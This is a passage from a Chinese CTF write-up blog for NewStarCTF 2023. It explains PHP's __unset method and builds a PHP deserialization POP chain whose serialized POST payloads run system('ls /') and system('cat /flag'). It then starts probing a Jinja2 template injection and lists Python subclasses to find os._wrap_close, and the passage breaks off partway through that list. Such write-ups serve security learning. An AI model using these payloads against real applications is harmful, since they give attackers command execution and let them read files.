class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$property</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Unsetting property: &quot;</span> . <span class="hljs-variable">$property</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$obj</span>-&gt;name); <span class="hljs-comment">// 调用__unset()方法</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">在上面的代码中，我们定义了一个MyClass类，它有一个私有属性<span class="hljs-variable">$name</span>。当使用<span class="hljs-keyword">unset</span>()函数删除<span class="hljs-variable">$obj</span>对象的<span class="hljs-variable">$name</span>属性时，会自动调用该对象的<span class="hljs-title function_ invoke__">__unset</span>()方法。在这个例子中，<span class="hljs-title function_ invoke__">__unset</span>()方法会显示一个消息<span class="hljs-string">&quot;Unsetting property: name&quot;</span>。<br><br>注意，<span class="hljs-title function_ invoke__">__unset</span>()方法只会在访问权限允许的情况下被调用。如果属性是私有的或受保护的，只有在类的内部才能删除该属性。<br></code></pre></td></tr></table></figure><p>pop链构造脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//反序列化自动调用</span><br>    <span class="hljs-comment">// public function __destruct()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在字符串比较可以调用__toString()函数=&gt;$this-&gt;name=new Then()</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Hello&quot;;</span><br>    <span class="hljs-comment">//     &#125;else&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Welcome to NewStarCTF 2023!&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在类调用，可以用于启动__invoke()函数</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __call($func, $vars)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在可以指定类的函数end()函数调用</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new CTF()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;end();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __invoke()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //getStr为Handle类的不存在函数所以可以用于调用__call</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new Handle()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;getStr();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     die(&quot;==GAME OVER==&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在变量删除函数可以调用魔术方法__unset</span><br>    <span class="hljs-comment">//     //$this-&gt;handle=new WhiteGod()</span><br>    <span class="hljs-comment">//     unset($this-&gt;handle-&gt;log);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-comment">// public function __unset($var)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在危险函数注入=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>    <span class="hljs-comment">//     ($this-&gt;func)($this-&gt;var);    </span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-comment">// @unserialize($_POST[&#x27;pop&#x27;]); </span><br><span class="hljs-comment">//构造pop链:</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$obj</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj3</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj3</span>;<br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133441613.png" alt="image-20231010133441613"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133746261.png" alt="image-20231010133746261"></p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/images/2023-11-3-newstar-3/image-20231010141411989.png" alt="image-20231010141411989"></p><p>使用Bp抓包:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141442978.png" alt="image-20231010141442978"></p><p>访问:&#x2F;secr3tofpop</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141614595.png" alt="image-20231010141614595"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010141800190.png" alt="image-20231010141800190"></p><p>我们输入的内容被渲染到了网页上，猜测存在ssti模板注入</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162819362.png" alt="image-20231010162819362"></p><p>可以了解到该ssti模板注入是在python3语言下的jinja2模板注入</p><p><img src="/images/2023-11-3-newstar-3/image-20231010163040317.png" alt="image-20231010163040317"></p><p>可以了解到该模板渲染是使用render_template_string()函数</p><p>先寻找类os._wrap_close：<br>寻找脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;urllib3.util.timeout.Timeout&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;urllib3.util.retry.Retry&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class 